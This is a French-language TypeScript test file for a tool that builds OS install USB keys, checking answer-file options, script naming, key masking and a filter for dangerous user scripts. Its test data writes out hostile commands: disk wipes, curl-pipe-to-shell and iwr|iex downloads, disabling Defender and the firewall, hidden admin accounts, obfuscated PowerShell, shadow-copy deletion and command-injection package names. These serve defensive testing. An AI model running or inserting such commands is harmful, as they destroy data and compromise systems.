// Genèse · Clés USB, lot C3 (côté serveur) : les options Windows dans le fichier de réponses, tes scripts (nom sûr,
// ordre, Windows et Linux), leur vérification par l'antivirus d'Odin, et l'action en lecture cle_apercu_script
// (aucune clé en clair, aucun mot de passe, rien d'écrit). Données fausses, dossiers temporaires neufs.
import assert from 'node:assert/strict';
import { mkdtempSync, readdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import test from 'node:test';
import * as scripts from '../src/valhalla/thjalfi/scripts.ts';
import { deposerCle } from '../src/valhalla/thjalfi/cles-windows.ts';
import { thjalfi } from '../src/valhalla/modules/thjalfi.ts';
import type { Answer } from '../src/valhalla/thjalfi/recipes.ts';
import type { ModCtx } from '../src/valhalla/types.ts';

const X = scripts as unknown as Record<string, (...a: unknown[]) => unknown>;
const answer: Answer = { host: 'pc-faux', user: 'essai', password: 'mot-de-passe-faux', locale: 'fr_FR.UTF-8', keymap: 'fr', timezone: 'Indian/Mayotte', packages: [], report: 'http://127.0.0.1/etat/faux' };
const base = { retirerExigences: true, effacerApres: false };

test('C3 · Windows : disque choisi à l\'installation (rien d\'effacé tout seul), compte local sans mot de passe écrit', () => {
  const xml = scripts.autounattendCle(answer, 'uefi', { ...base, disqueAuChoix: true, compteLocal: true, nomCompte: 'Famille', sansViePrivee: true, langueOdin: true } as never);
  assert.doesNotMatch(xml, /WillWipeDisk/, 'aucun disque effacé tout seul');
  assert.doesNotMatch(xml, /<InstallTo>/, 'le disque est demandé au moment d\'installer');
  assert.match(xml, /<LocalAccount wcm:action="add"><Name>Famille<\/Name>/);
  assert.doesNotMatch(xml, /<Password>/, 'aucun mot de passe écrit sur la clé');
  assert.match(xml, /net user "Famille" \/logonpasswordchg:yes/, 'le mot de passe est choisi à l\'ouverture de session');
  assert.match(xml, /<HideOnlineAccountScreens>true/);
  assert.match(xml, /<ProtectYourPC>3<\/ProtectYourPC>/);
  assert.match(xml, /BypassTPMCheck/);
  // Sans les options : comme Genèse avant (le comportement de la clé ne change pas pour l'écriture existante).
  const avant = scripts.autounattendCle(answer, 'uefi', base);
  assert.match(avant, /WillWipeDisk/);
});

test('C3 · Windows : compte en ligne, questions de confidentialité et langue laissées à Windows quand on le veut', () => {
  const xml = scripts.autounattendCle(answer, 'uefi', { ...base, compteLocal: false, sansViePrivee: false, langueOdin: false, retirerExigences: false } as never);
  assert.doesNotMatch(xml, /<UserAccounts>|<AutoLogon>/);
  assert.match(xml, /<HideOnlineAccountScreens>false/);
  assert.doesNotMatch(xml, /ProtectYourPC/);
  assert.doesNotMatch(xml, /International-Core|<TimeZone>/);
  assert.doesNotMatch(xml, /BypassTPMCheck/, 'exigences matérielles gardées');
  assert.equal(X.nomCompteValide('Famille'), true);
  for (const faux of ['', 'a/b', 'trop-long-pour-windows-oui', 'fin.', 'x"y']) assert.equal(X.nomCompteValide(faux), false, faux);
});

test('C3 · tes scripts : nom sûr, ordre gardé, lancés après les logiciels (Windows) et à la fin (Linux)', () => {
  assert.equal(X.nomScriptSur('mon réglage$(calc).ps1', 1), '01-mon_reglage_calc_.ps1');
  assert.equal(X.nomScriptSur('..\\..\\x.sh', 3), '03-x.sh');
  assert.equal(X.osDuScript('a.PS1'), 'windows'); assert.equal(X.osDuScript('a.cmd'), 'windows'); assert.equal(X.osDuScript('a.sh'), 'linux'); assert.equal(X.osDuScript('a.exe'), undefined);
  const mes = [{ nom: 'b.ps1', contenu: 'Write-Host b' }, { nom: 'l.sh', contenu: 'echo l' }, { nom: 'a.cmd', contenu: 'echo a' }];
  const w = scripts.apercu({ famille: 'windows', answer, opt: base, logiciels: [{ id: 'firefox', fichier: 'ff-faux.exe', args: '', msi: false }], scripts: mes } as never);
  const ps = w['apres.ps1'];
  assert.ok(ps.indexOf('ff-faux.exe') < ps.indexOf('01-b.ps1'), 'après les logiciels');
  assert.ok(ps.indexOf('01-b.ps1') < ps.indexOf('02-a.cmd'), 'dans l\'ordre');
  assert.ok(!ps.includes('l.sh'), 'un script Linux ne va pas à Windows');
  assert.equal(w['scripts/01-b.ps1'], 'Write-Host b');
  const u = scripts.apercu({ famille: 'ubuntu', answer, scripts: mes } as never);
  assert.match(u['user-data'], /cp \/cdrom\/odin\/scripts\/01-l\.sh \/target\/tmp\/01-l\.sh && curtin in-target -- sh \/tmp\/01-l\.sh/);
  assert.ok(u['user-data'].indexOf('01-l.sh') < u['user-data'].indexOf('shutdown: reboot'));
  const d = scripts.apercu({ famille: 'debian', answer, scripts: mes } as never);
  assert.match(d['preseed.cfg'], /in-target sh \/tmp\/01-l\.sh/);
  const r = scripts.apercu({ famille: 'rhel', answer, scripts: mes } as never);
  assert.match(r['ks.cfg'], /sh \/tmp\/01-l\.sh/);
});

test('C3 · tes scripts passent par l\'antivirus avant d\'être acceptés (jamais exécutés)', () => {
  const a = X.analyserScript as (n: string, c: string, s?: (n: string, c: string) => string | undefined) => { ok: boolean; raison?: string };
  assert.equal(a('ok.ps1', 'Write-Host ok').ok, true);
  assert.match(String(a('x.exe', 'MZ').raison), /\.ps1/);
  assert.match(String(a('v.sh', '   ').raison), /vide/);
  assert.match(String(a('d.sh', 'rm -rf /').raison), /effacer/);
  let vu = '';
  assert.match(String(a('m.cmd', 'echo', (n) => { vu = n; return 'refusé par l\'essai'; }).raison), /refusé par l'essai/);
  assert.equal(vu, 'm.cmd', 'l\'antivirus reçoit le script');
});

test('C3 · cle_apercu_script : lecture seule, clé du coffre masquée (4 derniers caractères), aucun mot de passe, antivirus', async () => {
  const home = mkdtempSync(join(tmpdir(), 'odin-c3s-home-')), dir = mkdtempSync(join(tmpdir(), 'odin-c3s-dir-'));
  deposerCle(home, dir, 'windows-11-pro', 'FAUX0-FAUX1-FAUX2-FAUX3-ZQ7K9');
  const avant = readdirSync(dir).sort();
  const action = thjalfi().actions.find((x) => x.id === 'cle_apercu_script');
  assert.ok(action, 'l\'action existe');
  assert.equal(action!.read, true, 'une lecture');
  const ctx = { home, dir, settings: {} } as unknown as ModCtx;
  const r = await action!.run(ctx, { systeme: { famille: 'windows', nom: 'Windows 11 Pro 24H2', fichier: 'Win11_Pro_faux.iso' }, logiciels: [{ id: 'vlc', fichier: 'vlc-faux.exe' }], scripts: [{ nom: 'a.ps1', contenu: 'Write-Host a' }, { nom: 'b.cmd', contenu: 'vssadmin delete shadows /all' }], windows: { compte: 'Famille' } });
  const d = r.data as { fichiers: Record<string, string>; scripts: Array<{ ok: boolean; raison?: string }>; activation: { fin: string } | null; cles: unknown[] };
  const tout = JSON.stringify(r);
  for (const m of ['FAUX0', 'FAUX3', 'ZQ7K9']) assert.ok(!tout.includes(m), `jamais « ${m} »`);
  assert.equal(d.activation?.fin, 'Q7K9');
  assert.match(d.fichiers['autounattend.xml'], /<Key>•••••-•••••-•••••-•••••-•Q7K9<\/Key>/);
  assert.deepEqual(d.scripts.map((x) => x.ok), [true, false]);
  assert.match(String(d.scripts[1].raison), /antivirus|effacer un disque/);
  assert.match(d.fichiers['apres.ps1'], /01-a\.ps1/); assert.doesNotMatch(d.fichiers['apres.ps1'], /b\.cmd/);
  assert.doesNotMatch(d.fichiers['autounattend.xml'], /<Password>/);
  // « Aucune » : pas de clé ; Linux : aucune empreinte de mot de passe.
  const r2 = await action!.run(ctx, { systeme: { famille: 'windows', nom: 'Windows 11 Pro' }, windows: { activation: 'aucune' } });
  assert.match((r2.data as { fichiers: Record<string, string> }).fichiers['autounattend.xml'], /<Key><\/Key>/);
  const r3 = await action!.run(ctx, { systeme: { famille: 'linux', nom: 'Ubuntu 24.04', fichier: 'ubuntu-faux.iso' }, logiciels: [{ id: 'gimp', fichier: 'gimp-faux.deb' }] });
  const ud = (r3.data as { fichiers: Record<string, string> }).fichiers['user-data'];
  assert.match(ud, /gimp-faux\.deb/); assert.doesNotMatch(ud, /\$6\$/);
  assert.deepEqual(readdirSync(dir).sort(), avant, 'rien n\'est écrit');
});

// ---------------- Relecture du lot C3 : les contournements trouvés, refusés maintenant ----------------
test('C3 · relecture : les déguisements usuels d\'un script dangereux sont refusés (filtre de texte, pas une garantie)', () => {
  const v = (c: string) => scripts.verifierScriptPerso(c);
  const dangereux: Array<[string, RegExp]> = [
    ['Clear-Disk -Number 0 -RemoveData -Confirm:$false', /effacer un disque/], ['Get-Disk | Format-Volume -DriveLetter C', /effacer un disque/],
    ['(echo select disk 0 & echo clean) > x.txt & diskpart /s x.txt', /effacer un disque/], ['Remove-Partition -DiskNumber 0 -PartitionNumber 1', /effacer un disque/],
    ['Format`-Volume -DriveLetter C', /effacer un disque/], ['f^ormat c: /q /y', /effacer un disque/], ["& ('Clear'+'-Disk') 0", /effacer un disque/],
    ['wipefs -a /dev/sda', /effacer un disque/], ['rm -r -f /', /effacer un disque/], ['rm -rf --no-preserve-root /', /effacer un disque/], ['rm "-rf" "/"', /effacer un disque/],
    ['shred -n1 /dev/nvme0n1', /effacer un disque/], ['mkfs\u200b.ext4 /dev/sda', /effacer un disque/], ['rm -rf \\\n /', /effacer un disque/],
    ['iwr http://exemple.invalid/x.ps1 | iex', /télécharge/], ['curl -s http://exemple.invalid/x | sh', /télécharge/], ['bash -c "$(wget -qO- http://exemple.invalid/x)"', /télécharge/],
    ['Invoke-WebRequest http://exemple.invalid/a.exe -OutFile a.exe\r\nStart-Process a.exe', /télécharge/],
    ['Set-MpPreference -DisableRealtimeMonitoring $true', /antivirus ou le pare-feu/], ['netsh advfirewall set allprofiles state off', /pare-feu/],
    ['Set-NetFirewallProfile -Enabled False', /pare-feu/], ['ufw disable', /pare-feu/], ['sc stop WinDefend', /antivirus/],
    ['net user cache P4ss /add & net localgroup administrators cache /add', /administrateur/], ['net localgroup Administrateurs cache /add', /administrateur/],
    ['useradd -o -u 0 -g 0 cache', /administrateur/], ['reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v cache /t REG_DWORD /d 0', /administrateur/],
    [`powershell -EncodedCommand ${Buffer.from('Write-Host x', 'utf16le').toString('base64')}`, /cache ce qu'il fait/], ['echo cm0gLXJmIC8= | base64 -d | sh', /télécharge|cache/],
    ['r=rm; $r -rf /tmp/x', /cache ce qu'il fait/], ['Set-Alias x Clear-Disk', /effacer|cache/], ['alias x=ls', /cache ce qu'il fait/], ['eval "$X"', /cache ce qu'il fait/],
    ["[ScriptBlock]::Create('Write-Host')", /cache ce qu'il fait/], ['$env:comspec[4,15,25]-join\'\'', /cache ce qu'il fait/],
  ];
  for (const [c, r] of dangereux) assert.match(String(v(c)), r, c);
  // Des scripts ordinaires passent (aucun faux refus sur ce qu'on écrit d'habitude).
  const ordinaires = [
    '$ErrorActionPreference = "Stop"\r\nWrite-Host "Bonjour"\r\n$x = Get-ChildItem C:\\Users; foreach ($f in $x) { Write-Host $f.Name }',
    '& "C:\\Program Files\\x\\y.exe" /S\r\nwinget install --id Mozilla.Firefox -e --silent\r\nRemove-Item -Recurse -Force C:\\Temp\\odin\r\nWrite-Host ("{0} fait" -f $n)\r\n$n += 1',
    '@echo off\r\nset X=1\r\necho %X%\r\nreg add HKLM\\SOFTWARE\\Policies\\x /v x /t REG_DWORD /d 1 /f',
    '#!/bin/sh\nset -e\napt-get update && apt-get install -y vlc gimp\nfor f in /home/*; do echo "$f"; done\nrm -rf /tmp/odin\nsystemctl enable ssh\nusermod -aG video marc\n[ -f x ] && (cd /tmp && ls)',
  ];
  for (const c of ordinaires) assert.equal(v(c), undefined, c);
  // Aucun motif ne s'emballe sur 64 Ko écrits exprès.
  const t0 = Date.now(); v('dd if='.repeat(10_000)); v('rm '.repeat(20_000)); assert.ok(Date.now() - t0 < 2000, 'rapide');
});

test('C3 · relecture : un nom de paquet .deb ne casse pas le user-data ni le preseed', () => {
  const u = scripts.scriptsLinuxCle(answer, 'ubuntu', 't', ['bon_1.0_amd64.deb', 'x"; reboot; ".deb', 'a\n  - evil: 1\n.deb', 'z$&.deb']);
  assert.match(u['user-data'], /bon_1\.0_amd64\.deb/);
  assert.doesNotMatch(u['user-data'], /reboot; |evil|z\$/);
  const d = scripts.scriptsLinuxCle(answer, 'debian', 't', ['x;id;.deb', 'ok.deb']);
  assert.doesNotMatch(d['preseed.cfg'], /x;id;/); assert.match(d['preseed.cfg'], /ok\.deb/);
});

test('C3 · relecture : la clé hors ligne ne télécharge rien au premier démarrage, et tout est pris sur place', () => {
  const w = scripts.apercu({ famille: 'windows', answer, opt: { ...base, effacerApres: true }, logiciels: [{ id: 'vlc', fichier: 'vlc.exe', args: '', msi: false }], scripts: [{ nom: 'a.ps1', contenu: 'Write-Host a' }] } as never);
  const xml = w['autounattend.xml'], ps = w['apres.ps1'];
  assert.doesNotMatch(xml, /DownloadString|WebClient|iex/i, 'rien n\'est téléchargé puis exécuté');
  assert.match(xml, /odin\\apres\.ps1/);
  assert.doesNotMatch(ps, /%ODIN_CLE%/, '« %ODIN_CLE% » ne veut rien dire en PowerShell');
  assert.match(ps, /Join-Path \$d\.Root 'logiciels\\windows'/);
  assert.match(ps, /"\$src\\vlc\.exe"/);
  assert.match(ps, /\$PSScriptRoot\\scripts\\01-a\.ps1/);
  assert.match(ps, /StartsWith\(\$env:SystemDrive/, 'les installeurs de la clé elle-même ne sont jamais effacés');
});

test('C3 · relecture : cle_apercu_script réservée au propriétaire, jamais de disque effacé tout seul, nom de compte sûr', async () => {
  const action = thjalfi().actions.find((x) => x.id === 'cle_apercu_script')!;
  assert.equal(action.proprietaireSeul, true, 'ni un membre, ni une tablette, ni une clé d\'API, ni une automatisation');
  const home = mkdtempSync(join(tmpdir(), 'odin-c3r-home-')), dir = mkdtempSync(join(tmpdir(), 'odin-c3r-dir-'));
  const ctx = { home, dir, settings: {} } as unknown as ModCtx;
  const r = await action.run(ctx, { systeme: { famille: 'windows', nom: 'Windows 11' }, windows: { disque: 'vide' } });
  assert.doesNotMatch((r.data as { fichiers: Record<string, string> }).fichiers['autounattend.xml'], /WillWipeDisk|<InstallTo>/, 'un appel direct ne remet pas l\'effacement du disque 0');
  for (const faux of ['%COMSPEC%', 'Ad\u202Emin', 'a\u200bb', '\ud800x']) assert.equal(X.nomCompteValide(faux), false, JSON.stringify(faux));
  const r2 = await action.run(ctx, { systeme: { famille: 'windows', nom: 'Windows 11' }, windows: { compte: '%COMSPEC%' } });
  assert.doesNotMatch((r2.data as { fichiers: Record<string, string> }).fichiers['autounattend.xml'], /%COMSPEC%/);
  const r3 = await action.run(ctx, { systeme: { famille: 'linux', nom: 'Ubuntu' }, scripts: [{ nom: 'C:\\x\\..\\a.sh', contenu: 'echo a' }] });
  assert.ok(Object.keys((r3.data as { fichiers: Record<string, string> }).fichiers).includes('scripts/01-a.sh'), 'le chemin Windows est retiré du nom');
});
